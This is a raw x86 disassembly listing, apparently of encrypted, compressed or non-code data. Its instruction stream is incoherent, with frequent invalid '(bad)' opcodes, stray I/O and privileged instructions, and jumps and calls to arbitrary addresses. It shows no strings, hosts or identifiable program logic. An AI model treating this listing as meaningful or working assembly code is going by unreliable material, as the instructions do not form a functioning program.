  40d6c9:	jns    0x40d6d5
  40d6cb:	enter  0xd404,0x30
  40d6cf:	lahf   
  40d6d0:	jge    0x40d6c5
  40d6d2:	adc    eax,0x9bf53e25
  40d6d7:	xor    ch,BYTE PTR ds:0xbdb3a148
  40d6dd:	lds    eax,FWORD PTR [eax+0xe]
  40d6e0:	xchg   esp,eax
  40d6e1:	inc    esp
  40d6e2:	stc    
  40d6e3:	enter  0xcf0a,0x9a
  40d6e7:	mov    ch,0xb2
  40d6e9:	mov    WORD PTR [di-0x6d],?
  40d6ed:	call   0x332d0580
  40d6f2:	mov    edx,0x75e21f34
  40d6f7:	mov    WORD PTR [eax+0x1081faf3],ds
  40d6fd:	fadd   QWORD PTR [esi-0x4d]
  40d700:	xor    al,BYTE PTR [edx+0x71]
  40d703:	xor    eax,0x22c77acc
  40d709:	jp     0x40d6b6
  40d70b:	lods   eax,DWORD PTR ds:[esi]
  40d70c:	pushf  
  40d70d:	cwde   
  40d70e:	icebp  
  40d70f:	stc    
  40d710:	int    0x67
  40d712:	rcl    BYTE PTR [ebp-0x6c],0x7c
  40d716:	ret    
  40d717:	outs   dx,BYTE PTR ds:[esi]
  40d718:	fistp  QWORD PTR [ebx+0x59]
  40d71b:	add    BYTE PTR [ebp+0x21],bl
  40d71e:	xchg   ecx,eax
  40d71f:	inc    ecx
  40d720:	ror    BYTE PTR [edx],cl
  40d722:	sub    ch,BYTE PTR [esi-0x3da80714]
  40d728:	pusha  
  40d729:	or     al,0x76
  40d72b:	mov    al,ch
  40d72d:	sbb    eax,0x8aba7cdf
  40d732:	sbb    al,0x4f
  40d734:	sbb    eax,0x6e24950
  40d739:	push   eax
  40d73a:	aam    0x37
  40d73c:	stos   BYTE PTR es:[edi],al
  40d73d:	pop    ss
  40d73e:	jle    0x40d769
  40d740:	push   ds
  40d741:	icebp  
  40d742:	mov    ecx,0xe5b7fd2e
  40d747:	aas    
  40d748:	cmp    esi,DWORD PTR [edx]
  40d74a:	mov    dl,0xc
  40d74c:	inc    esp
  40d74d:	jp     0x40d72f
  40d74f:	adc    edi,ebp
  40d751:	(bad)  
  40d752:	rcpps  xmm3,XMMWORD PTR [esi-0x33]
  40d756:	jae    0x40d7c3
  40d758:	je     0x40d7cb
  40d75a:	or     DWORD PTR ss:[esp+edx*8],0x634321f8
  40d762:	pop    ss
  40d763:	in     al,0x6
  40d765:	daa    
  40d766:	test   DWORD PTR ds:0x76dcf838,esi
  40d76c:	jnp    0x40d766
  40d76e:	lock js 0x40d743
  40d771:	stc    
  40d772:	scas   eax,DWORD PTR es:[edi]
  40d773:	popf   
  40d774:	pushf  
  40d775:	xor    DWORD PTR [esi+0x61391424],ecx
  40d77b:	test   eax,0x76c65543
  40d780:	push   esi
  40d781:	ss inc eax
  40d783:	aaa    
  40d784:	jl     0x40d77a
  40d786:	aas    
  40d787:	stos   BYTE PTR es:[edi],al
  40d788:	out    dx,eax
  40d789:	and    BYTE PTR [ebx],ah
  40d78b:	test   BYTE PTR [ebp+edi*1-0x2da1576],cl
  40d792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d793:	xchg   ebx,eax
  40d794:	icebp  
  40d795:	xor    eax,0x2dc7e55c
  40d79a:	or     eax,ebp
  40d79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79d:	call   FWORD PTR [eax]
  40d79f:	int3   
  40d7a0:	push   ecx
  40d7a1:	sub    al,0x91
  40d7a3:	pop    ecx
  40d7a4:	jne    0x40d801
  40d7a6:	stos   DWORD PTR es:[edi],eax
  40d7a7:	jle    0x40d752
  40d7a9:	dec    ebx
  40d7aa:	xchg   edx,eax
  40d7ab:	push   ds
  40d7ac:	cdq    
  40d7ad:	leave  
  40d7ae:	shr    DWORD PTR [ebx-0x296b8d97],1
  40d7b4:	adc    cl,BYTE PTR [ebx+0x25e4e689]
  40d7ba:	mov    eax,0x3b4d86da
  40d7bf:	(bad)  
  40d7c1:	lahf   
  40d7c2:	(bad)
  40d7c7:	mov    esi,0xdbd6dba8
  40d7cc:	leave  
  40d7cd:	je     0x40d7a6
  40d7cf:	std    
  40d7d0:	int3   
  40d7d1:	aam    0x1b
  40d7d3:	aam    0xc1
  40d7d5:	xor    edx,DWORD PTR [ebx+0x2dbc45eb]
  40d7db:	mov    dl,0x56
  40d7dd:	jne    0x40d84c
  40d7df:	jb     0x40d80d
  40d7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7e2:	imul   ebp,DWORD PTR [esi-0x7],0xffffff8c
  40d7e6:	add    ebx,DWORD PTR [eax+0x4265c54]
  40d7ec:	push   0xffffffe1
  40d7ee:	call   0xd3ef0944
  40d7f3:	aas    
  40d7f4:	outs   dx,BYTE PTR ds:[esi]
  40d7f5:	pushf  
  40d7f6:	xlat   BYTE PTR ds:[ebx]
  40d7f7:	jb     0x40d7ca
  40d7f9:	bound  esp,QWORD PTR ds:0x4992503c
  40d7ff:	xchg   esi,eax
  40d800:	inc    edi
  40d801:	test   al,0x85
  40d803:	cmp    cl,BYTE PTR [ebx+0x4b]
  40d806:	jnp    0x40d7f0
  40d808:	retf   
  40d809:	jle    0x40d84a
  40d80b:	push   edx
  40d80c:	rol    bh,0x49
  40d80f:	xor    bh,al
  40d811:	mov    ecx,0xa19bf640
  40d816:	rol    BYTE PTR [ebx],1
  40d818:	mov    esi,0xd59ceb90
  40d81d:	(bad)  
  40d81e:	rcl    bh,cl
  40d820:	jl     0x40d84f
  40d822:	adc    BYTE PTR [edi+0x24045ebb],bl
  40d828:	fild   DWORD PTR [edi-0x3e6a5b7b]
  40d82e:	cmp    edx,eax
  40d830:	and    DWORD PTR [esi],esp
  40d832:	ficomp DWORD PTR [ecx-0x77a09f2c]
  40d838:	xchg   edx,eax
  40d839:	cmova  ecx,ebp
  40d83c:	fs out dx,al
  40d83e:	aad    0xa
  40d840:	push   ebx
  40d841:	lahf   
  40d842:	(bad)  [ecx-0x45]
  40d845:	and    dl,BYTE PTR fs:[edx+0x28848359]
  40d84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84d:	repnz in al,0x45
  40d850:	sbb    dl,BYTE PTR [edi]
  40d852:	mov    dl,0x85
  40d854:	push   ds
  40d855:	cmc    
  40d856:	ficomp DWORD PTR [edi]
  40d858:	cmp    eax,0xa47fd148
  40d85d:	inc    ecx
  40d85e:	pop    edi
  40d85f:	loop   0x40d7e8
  40d861:	or     BYTE PTR [ecx-0xf3fa37],0xc2
  40d868:	sub    ebx,0xffffffd8
  40d86b:	push   ebx
  40d86c:	push   ss
  40d86d:	sub    al,0x5b
  40d86f:	into   
  40d870:	xchg   ebx,eax
  40d871:	aam    0xc5
  40d873:	lds    ecx,FWORD PTR [ebp+edi*1-0x611cc518]
  40d87a:	fidiv  DWORD PTR [ebp-0x323b1ff8]
  40d880:	sbb    eax,0x18882587
  40d885:	mov    ah,0xe8
  40d887:	inc    eax
  40d888:	sbb    edx,edi
  40d88a:	shr    DWORD PTR [edx+esi*2+0x4d],1
  40d88e:	in     al,dx
  40d88f:	cwde   
  40d890:	pop    edx
  40d891:	inc    edi
  40d892:	mov    al,ds:0x277f3067
  40d897:	mov    ds:0x11b63438,al
  40d89c:	push   0x2d
  40d89e:	pop    ss
  40d89f:	rcl    DWORD PTR [edx-0x1e95db29],0x52
  40d8a6:	hlt    
  40d8a7:	pop    ss
  40d8a8:	mov    dh,0xf6
  40d8aa:	sbb    edx,DWORD PTR [eax+ecx*2-0x284ef29b]
  40d8b1:	loope  0x40d8d4
  40d8b3:	(bad)  
  40d8b4:	call   0x1d8ae8eb
  40d8b9:	and    DWORD PTR [edi],esi
  40d8bb:	adc    BYTE PTR [ecx+eiz*2-0x4c27f158],al
  40d8c2:	xchg   esp,eax
  40d8c3:	scas   eax,DWORD PTR es:[edi]
  40d8c4:	xchg   BYTE PTR [ebp+0x4d],bh
  40d8c7:	sahf   
  40d8c8:	push   ecx
  40d8c9:	gs pop eax
  40d8cb:	mov    al,0xef
  40d8cd:	push   0x97c69b1e
  40d8d2:	inc    ecx
  40d8d3:	aad    0x5a
  40d8d5:	sbb    eax,0x76c71bd4
  40d8da:	std    
  40d8db:	pop    ss
  40d8dc:	out    0xdd,eax
  40d8de:	xor    ch,BYTE PTR [eax]
  40d8e0:	popa   
  40d8e1:	pop    ebp
  40d8e2:	add    eax,0xa2f43fdd
  40d8e7:	in     al,0x59
  40d8e9:	std    
  40d8ea:	dec    edi
  40d8eb:	sub    ebx,DWORD PTR [ebx+0x2ba626df]
  40d8f1:	xchg   ebx,eax
  40d8f2:	outs   dx,BYTE PTR ds:[esi]
  40d8f3:	into   
  40d8f4:	gs inc esp
  40d8f6:	in     al,0x49
  40d8f8:	sbb    eax,0x82390cdb
  40d8fd:	mov    ebx,0xb3474857
  40d902:	mov    al,ds:0x5771cbb
  40d907:	out    0xae,al
  40d909:	push   cs
  40d90a:	daa    
  40d90b:	test   eax,0x8caa7cda
  40d910:	push   edi
  40d911:	cmp    ch,BYTE PTR [esi-0x735227c8]
  40d917:	fmul   QWORD PTR [ebp+0x3717983f]
  40d91d:	(bad)  
  40d91e:	cmc    
  40d91f:	jmp    0x40d8b1
  40d921:	jno    0x40d8c8
  40d923:	add    esi,ebx
  40d925:	lea    edi,[edi]
  40d927:	and    edi,DWORD PTR [edx+eax*2-0xf]
  40d92b:	shr    DWORD PTR [ebx+0x6c],1
  40d92e:	lods   al,BYTE PTR ds:[esi]
  40d92f:	inc    edi
  40d930:	test   al,0xf2
  40d932:	iret   
  40d933:	stos   BYTE PTR es:[edi],al
  40d934:	mov    ds:0x26f3ce38,al
  40d939:	addr16 fs pop eax
  40d93c:	add    eax,0xba9c8012
  40d941:	pop    edx
  40d942:	or     eax,0xcbcb6c10
  40d947:	xchg   DWORD PTR [ecx-0x68d29a73],ebp
  40d94d:	lds    esi,FWORD PTR ds:0x4ac72cbf
  40d953:	add    BYTE PTR [edi+0x16],cl
  40d956:	mov    edi,ebp
  40d958:	mov    edi,0xed9a201b
  40d95d:	mov    ah,0x4c
  40d95f:	push   esi
  40d960:	pop    ebx
  40d961:	mov    al,ds:0xf934098b
  40d966:	sub    al,0x83
  40d968:	stos   DWORD PTR es:[edi],eax
  40d969:	stos   BYTE PTR es:[edi],al
  40d96a:	or     cl,BYTE PTR [edx+0x32]
  40d96d:	icebp  
  40d96e:	cs mov ah,0x83
  40d971:	lahf   
  40d972:	in     eax,0xad
  40d974:	push   esp
  40d975:	add    eax,0x8450f58f
  40d97a:	mov    eax,0x245e8b5b
  40d97f:	jmp    0x2576ba92
  40d984:	adc    ah,dl
  40d986:	push   0x7adbddd4
  40d98b:	add    al,0x33
  40d98d:	in     eax,0xbf
  40d98f:	fs cmp al,0x74
  40d992:	call   0x68b7d6c5
  40d997:	jb     0x40d9e9
  40d999:	paddb  mm5,QWORD PTR [ecx+eax*1+0x5d]
  40d99e:	nop
  40d99f:	mov    bh,bl
  40d9a1:	es jns 0x40d9f6
  40d9a4:	scas   al,BYTE PTR es:[edi]
  40d9a5:	or     DWORD PTR [edx-0x56],0x7a
  40d9a9:	xor    al,0x5f
  40d9ab:	mov    ecx,0xcb4681d1
  40d9b0:	xor    ah,BYTE PTR [ebx-0x176b7065]
  40d9b6:	ret    0x5ff4
  40d9b9:	test   BYTE PTR [eax+0x1b],0x73
  40d9bd:	clc    
  40d9be:	sub    BYTE PTR [eax+0x6356561a],ah
  40d9c4:	xchg   esp,eax
  40d9c5:	aaa    
  40d9c6:	inc    eax
  40d9c7:	data16 out dx,al
  40d9c9:	mov    dh,ch
  40d9cb:	imul   eax,DWORD PTR [ecx-0x31b55fce],0xffffffa0
  40d9d2:	dec    edx
  40d9d3:	xchg   ebp,eax
  40d9d4:	mov    bl,dl
  40d9d6:	not    esi
  40d9d8:	out    0xde,al
  40d9da:	mov    ch,0x82
  40d9dc:	sub    BYTE PTR [ecx-0x5d541ac4],cl
  40d9e2:	xchg   edx,eax
  40d9e3:	mov    al,0xf5
  40d9e5:	or     edx,DWORD PTR [esi+0x2c]
  40d9e8:	xchg   ebx,eax
  40d9e9:	es stc 
  40d9eb:	jbe    0x40d983
  40d9ed:	and    esp,DWORD PTR [esp+edi*1]
  40d9f0:	shl    BYTE PTR [ebx-0x268fde69],1
  40d9f6:	rol    DWORD PTR [esi],0x62
  40d9f9:	inc    edx
  40d9fa:	js     0x40d9c3
  40d9fc:	push   ds
  40d9fd:	out    dx,eax
  40d9fe:	cmp    DWORD PTR [edx],0x86ef6e7a
  40da04:	fsub   DWORD PTR [esi+0x5222e38b]
  40da0a:	dec    ebx
  40da0b:	pop    edx
  40da0c:	das    
  40da0d:	jg     0x40da64
  40da0f:	out    dx,eax
  40da10:	sbb    BYTE PTR [eax+0x5c],bl
  40da13:	cmp    edx,edx
  40da15:	scas   al,BYTE PTR es:[edi]
  40da16:	xor    eax,DWORD PTR [ebx]
  40da18:	sbb    esi,DWORD PTR [eax-0x60d60196]
  40da1e:	or     ecx,ebx
  40da20:	or     al,BYTE PTR [edi+0x30]
  40da23:	xchg   ebx,eax
  40da24:	dec    edi
  40da25:	xchg   ebx,eax
  40da26:	mov    ds:0x2d9d209b,al
  40da2b:	and    DWORD PTR [ecx-0x1a],esp
  40da2e:	fnstsw WORD PTR [ebx]
  40da30:	pop    edx
  40da31:	and    eax,0x5d6797aa
  40da36:	jo     0x40d9fa
  40da38:	sub    DWORD PTR [ecx+0x4cbe3a0c],0x2e4d4800
  40da42:	(bad)  
  40da43:	xor    esi,DWORD PTR [ecx]
  40da45:	fcmovbe st,st(0)
  40da47:	loope  0x40da68
  40da49:	mov    al,ds:0xb7ca6256
  40da4e:	cmp    DWORD PTR [ebx*2-0x6b146882],eax
  40da55:	jae    0x40da86
  40da57:	(bad)  
  40da58:	int    0x86
  40da5a:	xchg   esp,eax
  40da5b:	inc    ebx
  40da5c:	mov    ds:0xf78f195c,eax
  40da61:	leave  
  40da62:	sbb    ebp,ebx
  40da64:	mov    WORD PTR [edi+0x6172bb42],fs
  40da6a:	mov    ah,BYTE PTR [ecx-0x30429223]
  40da70:	(bad)  
  40da71:	jae    0x40dac9
  40da73:	es push esi
  40da75:	scas   al,BYTE PTR es:[edi]
  40da76:	ret    
  40da77:	mov    edi,0x4902b3c4
  40da7c:	push   0x6f9995e3
  40da81:	(bad)  
  40da83:	xor    edx,DWORD PTR [edx]
  40da85:	stos   DWORD PTR es:[edi],eax
  40da86:	push   ecx
  40da87:	pop    es
  40da88:	stos   DWORD PTR es:[edi],eax
  40da89:	fnstsw WORD PTR [eax-0x36d89d6d]
  40da8f:	xor    eax,0x72abd016
  40da94:	pop    esp
  40da95:	mov    ebx,0x1d92c8ee
  40da9a:	cli    
  40da9b:	sbb    dl,BYTE PTR [ecx]
  40da9d:	rcr    DWORD PTR [edx+0x21],cl
  40daa0:	xchg   edi,eax
  40daa1:	sar    dl,0xba
  40daa4:	out    dx,al
  40daa5:	and    bh,al
  40daa7:	mov    ds:0x3ebc4713,al
  40daac:	mov    ebp,0x55e91357
  40dab1:	mov    dl,0xb9
  40dab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab4:	loop   0x40db1b
  40dab6:	hlt    
  40dab7:	xchg   ebx,eax
  40dab8:	mov    eax,ds:0x77fa4be5
  40dabd:	pop    esp
  40dabe:	retf   0xd9ed
  40dac1:	call   0x6f127c13
  40dac6:	xor    ebp,DWORD PTR [ecx]
  40dac8:	push   ebx
  40dac9:	fisub  WORD PTR [eax-0x66]
  40dacc:	sbb    al,0xee
  40dace:	das    
  40dacf:	clc    
  40dad0:	sub    al,0x3a
  40dad2:	pop    ds
  40dad3:	into   
  40dad4:	add    esp,ecx
  40dad6:	out    0xa4,eax
  40dad8:	jmp    0xa22:0x531cf6f8
  40dadf:	shr    DWORD PTR [ecx-0x694ed0be],cl
  40dae5:	add    ch,BYTE PTR [ebx]
  40dae7:	js     0x40dac7
  40dae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daea:	or     al,0x7d
  40daec:	call   0x699b:0xc22a84fa
  40daf3:	popa   
  40daf4:	cmp    al,0x24
  40daf6:	xchg   esi,eax
  40daf7:	out    0x6d,eax
  40daf9:	add    ebp,DWORD PTR [edx]
  40dafb:	push   es
  40dafc:	stc    
  40dafd:	fcom   st(6)
  40daff:	in     eax,0xba
  40db01:	jae    0x40db1f
  40db03:	not    DWORD PTR [eax]
  40db05:	call   0xaad1:0x7daf615f
  40db0c:	stc    
  40db0d:	out    dx,eax
  40db0e:	ins    DWORD PTR es:[edi],dx
  40db0f:	jecxz  0x40db83
  40db11:	push   ebx
  40db12:	push   ss
  40db13:	call   0x15e2:0x70219aaf
  40db1a:	push   es
  40db1b:	in     eax,0xdc
  40db1d:	sbb    BYTE PTR ds:0xf424f1e8,bl
  40db23:	daa    
  40db24:	test   BYTE PTR [ebp+0x1186cf96],dl
  40db2a:	inc    edi
  40db2b:	jg     0x40db46
  40db2d:	or     cl,BYTE PTR [edx+0x17dedd20]
  40db33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db34:	out    0x17,eax
  40db36:	sbb    eax,0x4385d825
  40db3b:	or     al,BYTE PTR [eax+0x5bf715cc]
  40db41:	rol    BYTE PTR [esi-0x27],cl
  40db44:	add    eax,0xebfaaaf3
  40db49:	imul   esi,DWORD PTR [edi-0x53548a8b],0xfffffffc
  40db50:	loope  0x40db88
  40db52:	mov    ebp,0x8ba4c204
  40db57:	lods   al,BYTE PTR ds:[esi]
  40db58:	lea    ebp,ss:[ebx-0x6af60b07]
  40db5f:	fcomi  st,st(5)
  40db61:	lods   eax,DWORD PTR ds:[esi]
  40db62:	pop    esp
  40db63:	xor    cl,bh
  40db65:	push   0xffffffc0
  40db67:	cwde   
  40db68:	in     al,0xad
  40db6a:	mov    esp,eax
  40db6c:	inc    eax
  40db6d:	add    BYTE PTR [eax+0x3e],cl
  40db70:	xor    DWORD PTR [esi+0x28],0x5a
  40db74:	test   eax,0x46565164
  40db79:	push   esp
  40db7a:	rol    DWORD PTR [ecx-0x71211b63],cl
  40db80:	hlt    
  40db81:	cmp    dh,ch
  40db83:	in     al,0xa1
  40db85:	sahf   
  40db86:	push   ecx
  40db87:	jp     0x40db17
  40db89:	cli    
  40db8a:	loopne 0x40dbff
  40db8c:	inc    ah
  40db8e:	ins    DWORD PTR es:[edi],dx
  40db8f:	and    esi,DWORD PTR [edx+eiz*1-0x4b900ffd]
  40db96:	jmp    0xf7b6224
  40db9b:	mov    dl,0x6c
  40db9d:	and    cl,BYTE PTR [ebp+esi*2+0x1a375288]
  40dba4:	mov    bh,BYTE PTR [ebx-0x53648249]
  40dbaa:	out    0xf9,al
  40dbac:	loop   0x40db76
  40dbae:	pop    esi
  40dbaf:	test   DWORD PTR [ecx-0x5e],ecx
  40dbb2:	aam    0xe6
  40dbb4:	jnp    0x40dc30
  40dbb6:	retf   
  40dbb7:	adc    DWORD PTR [edi-0x62891511],ebp
  40dbbd:	lods   eax,DWORD PTR ds:[esi]
  40dbbe:	outs   dx,DWORD PTR ds:[esi]
  40dbbf:	(bad)  
  40dbc0:	cmove  ebp,DWORD PTR [edx-0x2f]
  40dbc4:	pop    ecx
  40dbc5:	cmc    
  40dbc6:	fidivr DWORD PTR [ecx]
  40dbc8:	xor    DWORD PTR [edx],ebx
  40dbca:	hlt    
  40dbcb:	mov    ebx,DWORD PTR [esi-0x4fde51c8]
  40dbd1:	inc    edi
  40dbd2:	push   ecx
  40dbd3:	enter  0x9b23,0x1b
  40dbd7:	scas   al,BYTE PTR es:[edi]
  40dbd8:	lods   al,BYTE PTR ds:[esi]
  40dbd9:	popa   
  40dbda:	sub    DWORD PTR [edi-0x7d98110d],eax
  40dbe0:	sbb    eax,0xc78a4877
  40dbe5:	hlt    
  40dbe6:	mov    cl,0x7f
  40dbe8:	dec    esp
  40dbe9:	sub    DWORD PTR [edi-0x1c56822b],ecx
  40dbef:	and    edx,DWORD PTR [esi+0x34]
  40dbf2:	xor    BYTE PTR [ecx],bl
  40dbf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbf5:	aaa    
  40dbf6:	pop    ebx
  40dbf7:	mov    ch,0x97
  40dbf9:	out    0x99,eax
  40dbfb:	jns    0x40dc36
  40dbfd:	jecxz  0x40dbf0
  40dbff:	pop    edi
  40dc00:	imul   ebp,DWORD PTR [ebp+0xe],0x189f5b5c
  40dc07:	cmp    al,0xfc
  40dc09:	and    ecx,DWORD PTR [esp+ebx*8]
  40dc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0d:	xor    ah,BYTE PTR [esi]
  40dc0f:	call   0xab32c2d3
  40dc14:	pop    ss
  40dc15:	push   0x59f02609
  40dc1a:	cli    
  40dc1b:	aam    0x10
  40dc1d:	std    
  40dc1e:	xor    DWORD PTR [eax+0x535109cb],0xffffffc6
  40dc25:	jmp    0x40dca1
  40dc27:	sub    al,0x27
  40dc29:	inc    ebx
  40dc2a:	imul   ebx,edx,0x15b63fac
  40dc30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc31:	call   0xfc74:0xfbd2b3f5
  40dc38:	test   edx,0x6a9859b8
  40dc3e:	popa   
  40dc3f:	mov    eax,ds:0x1b168c71
  40dc44:	mov    bh,0xdb
  40dc46:	cmp    BYTE PTR [ebp+eiz*1-0xa228326],al
  40dc4d:	mov    ds:0xa84723b7,al
  40dc52:	mov    ch,0x31
  40dc54:	imul   cl
  40dc56:	mul    BYTE PTR [edx+0x6]
  40dc59:	add    DWORD PTR [eax],ebx
  40dc5b:	cmp    edi,DWORD PTR [edx-0x608d37cd]
  40dc61:	sbb    al,0xb3
  40dc63:	xlat   BYTE PTR ds:[ebx]
  40dc64:	sbb    DWORD PTR [ebp+0x43],ebp
  40dc67:	fs loope 0x40dc34
  40dc6a:	add    al,BYTE PTR [ebx]
  40dc6c:	inc    ebx
  40dc6d:	lahf   
  40dc6e:	cli    
  40dc6f:	sbb    al,0x2a
  40dc71:	test   BYTE PTR [ebx+edi*1+0x58],bl
  40dc75:	rcr    BYTE PTR [edi+0x4fc07503],1
  40dc7b:	inc    eax
  40dc7c:	and    BYTE PTR [ecx-0x30],dl
  40dc7f:	inc    ecx
  40dc80:	jae    0x40dcf8
  40dc82:	ror    al,cl
  40dc84:	cmp    al,BYTE PTR [ecx+0x1767ad2b]
  40dc8a:	sbb    DWORD PTR [eax+eax*8-0x187dbdf1],edx
  40dc91:	inc    ebx
  40dc92:	int    0xf1
  40dc94:	pushf  
  40dc95:	dec    esi
  40dc96:	and    ebx,DWORD PTR [ebx-0x7f]
  40dc99:	stos   DWORD PTR es:[edi],eax
  40dc9a:	mov    eax,ds:0xa58fcdb3
  40dc9f:	pop    edi
  40dca0:	iret   
  40dca1:	pop    esi
  40dca2:	fisub  DWORD PTR [ebp+eiz*4+0x1]
  40dca6:	dec    edi
  40dca7:	rcl    BYTE PTR [edx-0x36a9bc99],1
  40dcad:	imul   edx,DWORD PTR [edx],0x7178427a
  40dcb3:	jmp    0x40dcec
  40dcb5:	xor    ebx,DWORD PTR [ecx-0x165ce8a]
  40dcbb:	or     eax,0x9f6d4f26
  40dcc0:	(bad)  
  40dcc1:	jno    0x40dd08
  40dcc3:	xor    DWORD PTR [edi-0x13],edi
  40dcc6:	mov    gs,WORD PTR [eax]
  40dcc8:	jo     0x40dcd9
  40dcca:	inc    ebx
  40dccb:	jp     0x40dcf0
  40dccd:	nop
  40dcce:	bound  ebp,QWORD PTR [edi]
  40dcd0:	mov    ebp,0xf9f65f52
  40dcd5:	nop
  40dcd6:	pop    edi
  40dcd7:	mov    cl,0x7e
  40dcd9:	xchg   esi,eax
  40dcda:	inc    ebp
  40dcdb:	adc    ecx,eax
  40dcdd:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40dcdf:	push   esi
  40dce0:	jne    0x40dce0
  40dce2:	fs xchg edx,eax
  40dce4:	sbb    DWORD PTR [esi+esi*1-0x4e04ef54],edi
  40dceb:	in     eax,0xd1
  40dced:	arpl   dx,si
  40dcef:	lds    esp,FWORD PTR [esi+0x18d6aef3]
  40dcf5:	push   ebx
  40dcf6:	sbb    dl,BYTE PTR [ebx-0xa]
  40dcf9:	mov    ch,0x2
  40dcfb:	ja     0x40dcf7
  40dcfd:	pushf  
  40dcfe:	xchg   esi,eax
  40dcff:	aam    0x23
  40dd01:	test   DWORD PTR [eax+0x328d969e],ecx
  40dd07:	aas    
  40dd08:	adc    ah,BYTE PTR [ebp+0x6c13d89]
  40dd0e:	sbb    BYTE PTR [edi-0x51],cl
  40dd11:	adc    eax,DWORD PTR [edx+edx*4]
  40dd14:	push   0xffffff9e
  40dd16:	mov    ebp,0x5999db5f
  40dd1b:	dec    eax
  40dd1c:	xlat   BYTE PTR ds:[ebx]
  40dd1d:	push   esi
  40dd1e:	(bad)  
  40dd1f:	clc    
  40dd20:	push   ebx
  40dd21:	inc    esp
  40dd22:	add    DWORD PTR [edi-0x25],eax
  40dd25:	mov    edi,DWORD PTR [edi+0x347b515f]
  40dd2b:	cmp    al,dl
  40dd2d:	xchg   ebx,eax
  40dd2e:	dec    ebp
  40dd2f:	pop    ebx
  40dd30:	icebp  
  40dd31:	cld    
  40dd32:	(bad)  
  40dd33:	stc    
  40dd34:	fstp   TBYTE PTR [esi-0x4d]
  40dd37:	sbb    BYTE PTR [edi],dh
  40dd39:	and    eax,0x260c8306
  40dd3e:	jge    0x40ddbb
  40dd40:	inc    esp
  40dd41:	sbb    al,0x19
  40dd43:	gs jns 0x40dd02
  40dd46:	inc    ecx
  40dd47:	mov    edi,0x995491b5
  40dd4c:	clc    
  40dd4d:	fs je  0x40dd4d
  40dd50:	mov    ?,WORD PTR [ebp-0x2d260825]
  40dd56:	popf   
  40dd57:	(bad)  
  40dd58:	iret   
  40dd59:	iret   
  40dd5a:	(bad)  [ecx-0x7b]
  40dd5d:	push   ebp
  40dd5e:	mov    esi,0x2d85785a
  40dd63:	add    edi,DWORD PTR [esi+0x7e]
  40dd66:	xchg   esp,eax
  40dd67:	ins    DWORD PTR es:[edi],dx
  40dd68:	pusha  
  40dd69:	shr    DWORD PTR [esi+0x75],0xa6
  40dd6d:	adc    ah,BYTE PTR [ebp-0x533f537b]
  40dd73:	inc    edi
  40dd74:	pop    ss
  40dd75:	xlat   BYTE PTR ds:[ebx]
  40dd76:	and    BYTE PTR [ebp+ecx*8+0x6],ah
  40dd7a:	into   
  40dd7b:	push   0x926779d
  40dd80:	push   es
  40dd81:	dec    ebp
  40dd82:	pop    ebp
  40dd83:	sbb    DWORD PTR [ebx+0x58999991],ebx
  40dd89:	jae    0x40dd74
  40dd8b:	and    esp,DWORD PTR [esi-0x3384b0bf]
  40dd91:	add    eax,0xafc3dffc
  40dd96:	mov    ecx,0x49c90b36
  40dd9b:	cld    
  40dd9c:	lea    esi,[eax]
  40dd9e:	aas    
  40dd9f:	cs sub eax,0x4d58ad8
  40dda5:	xlat   BYTE PTR ds:[ebx]
  40dda6:	mov    ds:0x878118bb,al
  40ddab:	xlat   BYTE PTR ds:[ebx]
  40ddac:	adc    al,0x1e
  40ddae:	aas    
  40ddaf:	push   edx
  40ddb0:	and    ah,BYTE PTR [ecx-0x7d]
  40ddb3:	and    al,0x63
  40ddb5:	pop    esi
  40ddb6:	pop    ebx
  40ddb7:	out    dx,al
  40ddb8:	sti    
  40ddb9:	inc    esp
  40ddba:	xchg   ebp,eax
  40ddbb:	leave  
  40ddbc:	push   edx
  40ddbd:	mov    esi,0xe682b187
  40ddc2:	xchg   ebp,eax
  40ddc3:	lock inc edi
  40ddc5:	mov    DWORD PTR [ebx+0xeca35fb],eax
  40ddcb:	ins    BYTE PTR es:[edi],dx
  40ddcc:	sahf   
  40ddcd:	sbb    al,0xd4
  40ddcf:	inc    eax
  40ddd0:	add    BYTE PTR [esi+0x1cb2edb9],bh
  40ddd6:	adc    BYTE PTR ds:0xd02f2d78,cl
  40dddc:	leave  
  40dddd:	pushf  
  40ddde:	jecxz  0x40de49
  40dde0:	ja     0x40dda8
  40dde2:	dec    esi
  40dde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde4:	pusha  
  40dde5:	sahf   
  40dde6:	stos   BYTE PTR es:[edi],al
  40dde7:	jmp    0xa7623c41
  40ddec:	dec    ebx
  40dded:	jp     0x40dd9e
  40ddef:	loope  0x40de03
  40ddf1:	nop
  40ddf2:	call   0x2fea2a12
  40ddf7:	das    
  40ddf8:	jno    0x40ddd4
  40ddfa:	pop    ss
  40ddfb:	mov    bh,ah
  40ddfd:	lods   al,BYTE PTR ds:[esi]
  40ddfe:	rol    DWORD PTR [ebp-0x30],1
  40de01:	jmp    DWORD PTR [eax+0x65bf84d8]
  40de07:	jnp    0x40de87
  40de09:	ror    ebp,cl
  40de0b:	ds cmc 
  40de0d:	inc    ebx
  40de0e:	loopne 0x40ddc0
  40de10:	mov    al,ds:0xb652e022
  40de15:	icebp  
  40de16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de17:	sub    dl,BYTE PTR [ebp-0x6b]
  40de1a:	adc    al,cl
  40de1c:	in     eax,0x37
  40de1e:	pop    edi
  40de1f:	out    dx,eax
  40de20:	aad    0xe3
  40de22:	dec    ebp
  40de23:	xor    ah,ch
  40de25:	call   0x2cc53473
  40de2a:	outs   dx,DWORD PTR ds:[esi]
  40de2b:	ja     0x40ddee
  40de2d:	cmp    DWORD PTR [ebp+0x14],ecx
  40de30:	das    
  40de31:	inc    esi
  40de32:	mov    WORD PTR [ecx-0x18],?
  40de35:	push   es
  40de36:	clc    
